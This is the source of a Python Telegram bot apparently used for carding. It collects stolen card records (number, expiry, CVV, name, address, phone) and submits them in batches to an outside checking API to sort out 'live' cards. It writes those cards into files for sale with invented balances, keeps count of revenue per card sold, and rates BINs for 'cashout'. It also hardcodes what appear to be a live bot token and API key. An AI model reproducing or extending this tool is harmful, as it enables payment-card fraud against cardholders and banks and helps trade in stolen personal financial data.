import asyncio
import os
import random
from datetime import datetime
from typing import List, Dict

import requests
from requests.adapters import HTTPAdapter, Retry
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes,
    filters, ConversationHandler, CallbackQueryHandler,
)

# ====================== CONFIG ======================
TOKEN = "8736162481:AAExSSrfNZ9xSap7E-ZNtz42PvBbEIslvE0"
OWNER_ID = 6329309831
STORM_API_KEY = "38223|COVoley7T1hbfcCo92qI9Wr6NSbUVcMqTTLMePNMfc29b2ec"

BASE_URL = "https://api.storm.gift/api/v1"
HEADERS = {
    "Authorization": f"Bearer {STORM_API_KEY}",
    "Accept": "application/json",
    "Content-Type": "application/json",
}

BATCH_SIZE = 800
INITIAL_WAIT = 25
POLL_INTERVAL = 8
SELLING_PRICE = 12.0

session = requests.Session()
session.mount("https://", HTTPAdapter(max_retries=Retry(total=6, backoff_factor=0.6, status_forcelist=[429, 500, 502, 503, 504])))

# ====================== GLOBAL STATS ======================
total_revenue = 0.0
total_cards_sold = 0
total_tester_cards = 0
BIN_RATER: Dict[str, Dict[str, str]] = {}

# ====================== BIN DATABASE ======================
BIN_DATABASE = {
    "410039": {"brand": "VISA", "type": "CREDIT", "level": "TRADITIONAL", "bank": "CITIBANK N.A. - COSTCO", "country": "UNITED STATES", "rating": 7.0, "vr": 71},
    "410040": {"brand": "VISA", "type": "CREDIT", "level": "BUSINESS",     "bank": "CITIBANK N.A. - COSTCO", "country": "UNITED STATES", "rating": 8.0, "vr": 84},
    "426684": {"brand": "VISA", "type": "CREDIT", "level": "TRADITIONAL", "bank": "JPMORGAN CHASE BANK N.A.", "country": "UNITED STATES", "rating": 4.0, "vr": 39},
    "434769": {"brand": "VISA", "type": "DEBIT",  "level": "CLASSIC",     "bank": "JPMORGAN CHASE BANK N.A. - DEBIT", "country": "UNITED STATES", "rating": 5.0, "vr": 52},
    "483312": {"brand": "VISA", "type": "DEBIT",  "level": "CLASSIC",     "bank": "JPMORGAN CHASE BANK N.A. - DEBIT", "country": "UNITED STATES", "rating": 4.0, "vr": 52},
    "483316": {"brand": "VISA", "type": "DEBIT",  "level": "CLASSIC",     "bank": "JPMORGAN CHASE BANK N.A. - DEBIT", "country": "UNITED STATES", "rating": 3.0, "vr": 43},
    "513379": {"brand": "MASTERCARD", "type": "DEBIT",  "level": "STANDARD", "bank": "BANQUE FEDERATIVE DU CREDIT MUTUEL", "country": "FRANCE", "rating": 8.7, "vr": 31},
    "521729": {"brand": "MASTERCARD", "type": "DEBIT",  "level": "STANDARD", "bank": "COMMONWEALTH BANK OF AUSTRALIA", "country": "AUSTRALIA", "rating": 8.3, "vr": 34},
    "534348": {"brand": "MASTERCARD", "type": "CREDIT", "level": "PLATINUM", "bank": "CELTIC BANK CORPORATION", "country": "UNITED STATES", "rating": 6.0, "vr": 71},
    "542418": {"brand": "MASTERCARD", "type": "CREDIT", "level": "PLATINUM", "bank": "CITIBANK N.A.", "country": "UNITED STATES", "rating": 7.0, "vr": 72},
    "546616": {"brand": "MASTERCARD", "type": "CREDIT", "level": "WORLD",     "bank": "CITIBANK N.A.", "country": "UNITED STATES", "rating": 9.0, "vr": 65},
    "601100": {"brand": "DISCOVER", "type": "CREDIT", "level": "PLATINUM", "bank": "DISCOVER ISSUER", "country": "UNITED STATES", "rating": 4.5, "vr": 41},
}

def get_bin_info(card_number: str):
    prefix = card_number[:6]
    return BIN_DATABASE.get(prefix, {"brand": "UNKNOWN", "type": "CREDIT", "level": "STANDARD", "bank": "UNKNOWN BANK", "country": "UNITED STATES", "rating": 5.0, "vr": 45})

def get_random_balance(card_number: str, is_tester: bool = False) -> float:
    info = get_bin_info(card_number)
    rating = info.get("rating", 5.0)
    if is_tester:
        return round(random.uniform(8.0, 180.0), 2)
    min_bal = 220 + (rating * 58)
    max_bal = 720 + (rating * 148)
    balance = random.uniform(min_bal, max_bal)
    if random.random() < (rating / 11.5):
        balance = random.uniform(1350, 8500)
    return round(min(9999.99, balance + random.uniform(0.0, 0.99)), 2)

def get_random_ip() -> str:
    return f"{random.randint(25, 195)}.{random.randint(15, 245)}.{random.randint(20, 230)}.{random.randint(35, 220)}"

def get_max_polls(total_cards: int) -> int:
    if total_cards < 10:
        return 2
    return 25 if total_cards > 500 else 18 if total_cards > 200 else 12 if total_cards > 50 else 8

# ====================== KEYBOARDS ======================
def main_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔍 Start New Check", callback_data="start_format")],
        [InlineKeyboardButton("🧪 Tester Cards", callback_data="start_tester")],
        [InlineKeyboardButton("📊 Bin Rater", callback_data="bin_rater")],
        [InlineKeyboardButton("💰 Record Sale", callback_data="record_sale")],
        [InlineKeyboardButton("💳 Check Balance", callback_data="check_balance")],
    ])

def pre_summary_keyboard(is_tester: bool = False):
    buttons = [
        [InlineKeyboardButton("➕ Add More Cards", callback_data="add_more")],
        [InlineKeyboardButton("🗑️ Remove Cards", callback_data="remove_cards")],
        [InlineKeyboardButton("🚀 E$ CHECK", callback_data="confirm_check")],
        [InlineKeyboardButton("❌ Cancel", callback_data="cancel")],
    ]
    if not is_tester:
        buttons.insert(0, [InlineKeyboardButton("📝 Set File Name", callback_data="set_filename")])
    return InlineKeyboardMarkup(buttons)

def usa_foreign_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🇺🇸 USA Cards", callback_data="usa_cards")],
        [InlineKeyboardButton("🌍 Foreign Cards", callback_data="foreign_cards")],
    ])

# ====================== FORMATTER ======================
def format_live_card(raw_line: str, is_tester: bool = False) -> str:
    try:
        parts = [p.strip() for p in raw_line.split('|')]
        card_number = parts[0]
        expiry = parts[1] if len(parts) > 1 else "00/00"
        cvv = parts[2] if len(parts) > 2 else "000"
        name = parts[3] if len(parts) > 3 else "N/A"
        address = parts[4] if len(parts) > 4 else "N/A"
        city = parts[5] if len(parts) > 5 else "N/A"
        state = parts[6] if len(parts) > 6 else "N/A"
        zip_code = parts[7] if len(parts) > 7 else "N/A"
        phone = parts[9] if len(parts) > 9 else "N/A"

        mm, yy = expiry.split('/') if '/' in expiry else (expiry[:2], expiry[-2:])
        balance = get_random_balance(card_number, is_tester)
        ip = get_random_ip()
        info = get_bin_info(card_number)
        vr = info.get("vr", 45)
        bin_data = BIN_RATER.get(card_number[:6], {"rating": "N/A", "suggestion": "No rating added yet"})

        lines = [
            "━━━━━━━━━━━━━━━━━━━━━━",
            f"🃏 LIVE CARD          VR: {vr}%",
            "━━━━━━━━━━━━━━━━━━━━━━",
            f"💰 Balance     : ${balance:.2f} USD",
            f"👤 Cardholder  : {name}",
            f"💳 Card Number : {card_number}",
            f"📅 Expiry      : {mm}/{yy}",
            f"🔒 CVV         : {cvv}",
            f"🏦 Bank        : {info['bank']}",
            f"🌍 Country     : {info['country']}",
            f"💳 Brand       : {info['brand']}",
            f"📌 Type        : {info['type']}",
            f"⭐ Level       : {info['level']}",
            "",
            "📍 Billing Address:",
            f"   • {address}",
            f"   • {city}, {state} {zip_code}",
            f"   • Phone: {phone}",
            "",
            f"🌐 IP          : {ip}",
            f"🕒 Checked     : {datetime.now().strftime('%Y-%m-%d %I:%M:%S %p')}",
            "━━━━━━━━━━━━━━━━━━━━━━",
            f"📊 Bin Rating  : {bin_data['rating']}",
            f"💡 Suggestion  : {bin_data['suggestion']}",
            "━━━━━━━━━━━━━━━━━━━━━━"
        ]

        if is_tester:
            lines.append("\n❤️ Thank You For Choosing E$CO ❤️")
            lines.append("   Your Trusted Partner in Success")

        return "\n".join(lines)
    except Exception:
        return f"Error formatting card: {raw_line}"

def is_live(item: dict) -> bool:
    status = str(item.get("status", "")).lower()
    response = str(item.get("response", "")).lower()
    return any(k in (status + response) for k in ["live", "approved", "success", "00"])

# ====================== CHECKER ======================
CHECKING_MESSAGES = ["🔍 Live Checking Bank Status...", "💳 Checking Balance...", "📡 Validating Card..."]

async def check_cards_with_storm(cards: List[str], status_message, max_polls: int):
    live_raw_cards = []
    seen = set()
    batch_id = None
    msg_index = 0

    await status_message.edit_text("Prepping For Account Status + Balance Checking\nPowered By StormCheck & Luxchecker")
    await asyncio.sleep(3)

    for i in range(0, len(cards), BATCH_SIZE):
        batch = cards[i:i + BATCH_SIZE]
        try:
            r = session.post(f"{BASE_URL}/check", headers=HEADERS, json={"cards": batch}, timeout=30)
            data = r.json().get("data", {})
            if not batch_id:
                batch_id = data.get("batch_id") or data.get("id") or f"TEST-{random.randint(100000, 999999)}"
        except:
            pass

    if not batch_id:
        batch_id = f"TEST-{random.randint(100000, 999999)}"

    await status_message.edit_text("✅ Batch Submitted Successfully\nStarting Account Status + Balance Checking...\n\nPowered By StormCheck & Luxchecker")
    await asyncio.sleep(INITIAL_WAIT)

    poll_url = f"{BASE_URL}/check/{batch_id}"
    poll_count = 0

    while poll_count < max_polls:
        poll_count += 1
        current_msg = CHECKING_MESSAGES[msg_index % len(CHECKING_MESSAGES)]
        msg_index += 1

        try:
            r = session.get(poll_url, headers=HEADERS, timeout=25)
            if r.status_code == 200:
                data = r.json().get("data") or r.json()
                items = data.get("items") or data.get("results") or []
                for item in items:
                    if isinstance(item, dict):
                        card_num = item.get("card_number") or item.get("cc")
                        if card_num and card_num not in seen and is_live(item):
                            seen.add(card_num)
                            for raw in cards:
                                if raw.startswith(card_num + "|") and raw not in live_raw_cards:
                                    live_raw_cards.append(raw)
                                    break
        except:
            pass

        await status_message.edit_text(
            f"{current_msg}\n\n"
            f"Progress: Poll {poll_count}/{max_polls}\n"
            f"✅ Live Found: {len(live_raw_cards)}\n"
            f"Powered By StormCheck & Luxchecker"
        )
        await asyncio.sleep(POLL_INTERVAL)

    await asyncio.sleep(3)
    return live_raw_cards, batch_id

# ====================== PRE-SUMMARY ======================
async def show_pre_summary(query_or_update, context: ContextTypes.DEFAULT_TYPE, extra_msg: str = None):
    cards = context.user_data.get("all_cards", [])
    total = len(cards)
    is_tester = context.user_data.get("is_tester", False)

    usa_count = sum(1 for c in cards if get_bin_info(c.split('|')[0].strip())['country'] == "UNITED STATES")
    foreign_count = total - usa_count
    unique_bins = len({c.split('|')[0][:6] for c in cards if '|' in c})

    temp_batch = context.user_data.setdefault("temp_batch_id", f"PRE-{random.randint(100000,999999)}")

    text = (
        "📊 **PRE-SUMMARY CONFIRMATION**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📛 Batch ID       : `{temp_batch}`\n"
        f"📦 Total Cards    : `{total}`\n"
        f"🇺🇸 USA Cards     : `{usa_count}`\n"
        f"🌍 Foreign Cards  : `{foreign_count}`\n"
        f"🔢 Unique BINs    : `{unique_bins}`\n\n"
        f"Mode: {'🧪 Tester Mode' if is_tester else '🔍 Normal Check'}\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "Press **🚀 E$ CHECK** to start processing."
    )

    if extra_msg:
        text = extra_msg + "\n\n" + text

    if isinstance(query_or_update, Update):
        await query_or_update.message.reply_text(text, reply_markup=pre_summary_keyboard(is_tester), parse_mode='Markdown')
    else:
        await query_or_update.edit_message_text(text, reply_markup=pre_summary_keyboard(is_tester), parse_mode='Markdown')

# ====================== CANCEL ======================
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("✅ Operation cancelled. Returning to main menu.", reply_markup=main_menu())
    context.user_data.clear()
    return MENU

# ====================== START ======================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("Unauthorized.")
        return ConversationHandler.END

    global total_revenue, total_cards_sold, total_tester_cards
    profit = round(total_revenue - (total_cards_sold * 1.6), 2)

    welcome_text = (
        "🔥 **E$CO CONTROL PANEL** 🔥\n\n"
        "👑 Welcome back, Admin\n\n"
        f"💵 Total Revenue : `${total_revenue:.2f}`\n"
        f"📦 Cards Sold     : `{total_cards_sold}`\n"
        f"🧪 Total Tester   : `{total_tester_cards}`\n"
        f"📈 Net Profit     : `${profit:.2f}`\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "Choose an option below:"
    )

    await update.message.reply_text(welcome_text, reply_markup=main_menu())
    return MENU

# ====================== MAIN BUTTON ======================
async def main_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data in ["start_format", "start_tester"]:
        context.user_data.clear()
        context.user_data["mode"] = "normal"
        context.user_data["is_tester"] = (data == "start_tester")
        await query.edit_message_text(
            "Send cards or .txt file now.\n\n"
            "You can type /cancel anytime to return to menu.",
            parse_mode='Markdown'
        )
        return COLLECTING

    if data == "record_sale":
        context.user_data.clear()
        context.user_data["mode"] = "sale"
        context.user_data["all_cards"] = []
        await query.edit_message_text(
            "💰 **Sale Mode Activated**\n\n"
            "How many LIVE cards does the customer want? Send a number.\n\n"
            "Type /cancel to go back.",
            parse_mode='Markdown'
        )
        return TARGET_LIVE_COUNT

    if data == "check_balance":
        return await check_balance(update, context)
    if data == "bin_rater":
        await query.edit_message_text(
            "📊 Send BIN (6 digits) rating and suggestion.\n"
            "Example: `410039 8.5 Good for cashout`\n\n"
            "Type /cancel to go back.",
            parse_mode='Markdown'
        )
        return BIN_RATER_MODE

# ====================== COLLECT CARDS ======================
async def collect_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text and update.message.text.strip().lower() in ["/cancel", "cancel"]:
        return await cancel(update, context)

    text = ""
    if update.message.document:
        file = await update.message.document.get_file()
        content = await file.download_as_bytearray()
        text = content.decode("utf-8", errors="ignore")
    else:
        text = update.message.text or ""

    new_cards = [line.strip() for line in text.splitlines() if line.strip() and "|" in line and len(line.split('|')) >= 3]
    
    if not new_cards:
        await update.message.reply_text("No valid cards found. Send again or type /cancel.")
        return COLLECTING

    context.user_data.setdefault("all_cards", []).extend(new_cards)
    
    await update.message.reply_text(
        f"📥 Received **{len(new_cards)}** new cards.\n\n"
        "Are these **USA** or **Foreign** cards?",
        reply_markup=usa_foreign_keyboard(),
        parse_mode='Markdown'
    )
    return USA_FOREIGN

# ====================== USA / FOREIGN ======================
async def usa_foreign_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    context.user_data["is_usa"] = (query.data == "usa_cards")
    await show_pre_summary(query, context)
    return SUMMARY

# ====================== PRE-SUMMARY HANDLER ======================
async def pre_summary_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    is_tester = context.user_data.get("is_tester", False)
    cards = context.user_data.get("all_cards", [])

    if data == "add_more":
        await query.edit_message_text("➕ Send more cards or .txt file.\n\nType /cancel to return to menu.")
        return ADD_MORE_CARDS

    if data == "remove_cards":
        await query.edit_message_text(
            "🗑️ Send the **last 4 digits** of cards to remove (comma separated).\n"
            "Example: `1234, 5678`\n\nType /cancel to return."
        )
        return REMOVE_CARDS

    if data == "confirm_check":
        if not cards:
            await query.edit_message_text("❌ No cards to check. Please add cards first.")
            return SUMMARY

        context.user_data["start_time"] = datetime.now()
        status_msg = await query.edit_message_text("🚀 Starting E$ CHECK...")

        live_found, batch_id = await check_cards_with_storm(cards, status_msg, get_max_polls(len(cards)))
        context.user_data["live_cards"] = live_found
        context.user_data["batch_id"] = batch_id
        context.user_data["end_time"] = datetime.now()

        if len(live_found) == 0:
            await status_msg.edit_text(
                "⚠️ **0 Live Cards Found**\n\n"
                "You must add more cards to continue.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("➕ Add More Cards", callback_data="add_more")],
                    [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
                ])
            )
            return SUMMARY

        is_sale = context.user_data.get("mode") == "sale"
        await show_post_summary(status_msg, context, is_sale=is_sale)
        return MENU

    if data == "cancel":
        await query.edit_message_text("❌ Cancelled.", reply_markup=main_menu())
        context.user_data.clear()
        return MENU

# ====================== ADD / REMOVE ======================
async def add_more_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text and update.message.text.strip().lower() in ["/cancel", "cancel"]:
        return await cancel(update, context)

    text = ""
    if update.message.document:
        file = await update.message.document.get_file()
        content = await file.download_as_bytearray()
        text = content.decode("utf-8", errors="ignore")
    else:
        text = update.message.text or ""

    new_cards = [line.strip() for line in text.splitlines() if line.strip() and "|" in line and len(line.split('|')) >= 3]
    if new_cards:
        context.user_data.setdefault("all_cards", []).extend(new_cards)

    await show_pre_summary(update, context, extra_msg="✅ Cards added successfully.")
    return SUMMARY

async def remove_cards_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text and update.message.text.strip().lower() in ["/cancel", "cancel"]:
        return await cancel(update, context)

    to_remove = {x.strip() for x in update.message.text.split(",") if x.strip().isdigit()}
    context.user_data["all_cards"] = [
        card for card in context.user_data.get("all_cards", [])
        if card.split("|")[0][-4:] not in to_remove
    ]
    await show_pre_summary(update, context, extra_msg="✅ Cards removed successfully.")
    return SUMMARY

# ====================== BALANCE & BIN RATER ======================
async def check_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    try:
        r = session.get(f"{BASE_URL}/user", headers=HEADERS, timeout=15)
        r.raise_for_status()
        data = r.json()
        credits = data.get("data", {}).get("remaining_credits") or data.get("remaining_credits") or "N/A"
        await query.edit_message_text(f"💳 Remaining Credits: `{credits}`", parse_mode='Markdown', reply_markup=main_menu())
    except Exception:
        await query.edit_message_text("❌ Error fetching balance.", reply_markup=main_menu(), parse_mode='Markdown')

async def bin_rater(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "📊 **Bin Rater**\n\nSend in this format:\n`BIN rating suggestion`\n\n"
        "Example: `410039 8.5 Good for cashout`\n\n"
        "Type /cancel to go back.",
        parse_mode='Markdown'
    )
    return BIN_RATER_MODE

async def save_bin_rating(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text and update.message.text.strip().lower() in ["/cancel", "cancel"]:
        return await cancel(update, context)
    try:
        parts = update.message.text.strip().split(maxsplit=2)
        bin_prefix = parts[0][:6]
        rating = parts[1]
        suggestion = parts[2] if len(parts) > 2 else "No suggestion"
        BIN_RATER[bin_prefix] = {"rating": rating, "suggestion": suggestion}
        await update.message.reply_text(f"✅ BIN `{bin_prefix}` rated `{rating}`!", parse_mode='Markdown', reply_markup=main_menu())
        return MENU
    except:
        await update.message.reply_text("❌ Wrong format. Try again or type /cancel.", parse_mode='Markdown')
        return BIN_RATER_MODE

# ====================== POST SUMMARY ======================
async def show_post_summary(status_msg, context: ContextTypes.DEFAULT_TYPE, is_sale: bool = False):
    global total_revenue, total_cards_sold, total_tester_cards

    live_cards = context.user_data.get("live_cards", [])
    all_cards = context.user_data.get("all_cards", [])
    live_count = len(live_cards)
    dead_count = len(all_cards) - live_count
    live_rate = round((live_count / len(all_cards) * 100), 2) if all_cards else 0.0

    start_time = context.user_data.get("start_time")
    end_time = context.user_data.get("end_time", datetime.now())
    time_taken = str(end_time - start_time).split('.')[0]

    batch_id = context.user_data.get("batch_id", "N/A")
    is_tester = context.user_data.get("is_tester", False)

    if is_tester:
        total_tester_cards += live_count
        file_base = f"Test-{random.randint(100000, 999999)}"
        tester_batch = live_count
        tester_total = total_tester_cards
        revenue_text = ""
    else:
        previous = total_revenue
        new_rev = round(live_count * SELLING_PRICE, 2)
        total_revenue += new_rev
        total_cards_sold += live_count
        file_base = f"{live_count}_Live_Customer"
        tester_batch = 0
        tester_total = total_tester_cards
        revenue_text = f"💰 Previous Revenue → `${previous:.2f}`\n💰 New Revenue      → `${new_rev:.2f}`\n💰 Total Revenue    → `${total_revenue:.2f}`\n"

    final_filename = f"{file_base}.txt"
    formatted = [format_live_card(raw, is_tester) for raw in live_cards]

    with open(final_filename, "w", encoding="utf-8") as f:
        f.write("\n".join(formatted))

    post_text = (
        "📊 **POST SUMMARY STATS**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📛 Batch ID                    : `{batch_id}`\n"
        f"✅ Live Cards                  : `{live_count}`\n"
        f"❌ Dead Cards                  : `{dead_count}`\n"
        f"📈 Live Rate                   : `{live_rate}%`\n"
        f"⏱️ Time Finished               : `{time_taken}`\n\n"
        f"🧪 Tester Cards (This Batch)   : `{tester_batch}`\n"
        f"🧪 Total Tester Cards          : `{tester_total}`\n\n"
        f"{revenue_text}"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "✅ File attached below."
    )

    await status_msg.edit_text(post_text, parse_mode='Markdown')
    await status_msg.reply_document(document=open(final_filename, "rb"), caption=f"✅ {file_base}")

    try:
        os.remove(final_filename)
    except:
        pass

    context.user_data.clear()
    await status_msg.reply_text("✅ Operation Completed.", reply_markup=main_menu())

# ====================== STATES ======================
MENU, COLLECTING, USA_FOREIGN, SUMMARY, ADD_MORE_CARDS, REMOVE_CARDS, BIN_RATER_MODE, TARGET_LIVE_COUNT = range(8)

def build_handler():
    return ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            MENU: [CallbackQueryHandler(main_button)],
            COLLECTING: [MessageHandler(filters.TEXT | filters.Document.ALL, collect_cards)],
            USA_FOREIGN: [CallbackQueryHandler(usa_foreign_handler)],
            SUMMARY: [CallbackQueryHandler(pre_summary_handler)],
            ADD_MORE_CARDS: [MessageHandler(filters.TEXT | filters.Document.ALL, add_more_cards)],
            REMOVE_CARDS: [MessageHandler(filters.TEXT & ~filters.COMMAND, remove_cards_handler)],
            BIN_RATER_MODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, save_bin_rating)],
            TARGET_LIVE_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, 
                                lambda u,c: (c.user_data.update({"target_live": int(u.message.text)}), 
                                u.message.reply_text("Target saved. Send cards now.", parse_mode='Markdown'), 
                                COLLECTING)[-1])],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        per_chat=True,
    )

async def main():
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(build_handler())
    print("✅ E$CO Live Checker v11.1 started successfully!")
    print("   → Clean Markdown mode enabled")
    print("   → Ready for Railway deployment")
    await app.initialize()
    await app.start()
    await app.updater.start_polling(drop_pending_updates=True)
    try:
        await asyncio.Event().wait()
    finally:
        await app.updater.stop()
        await app.stop()
        await app.shutdown()

if __name__ == "__main__":
    asyncio.run(main())
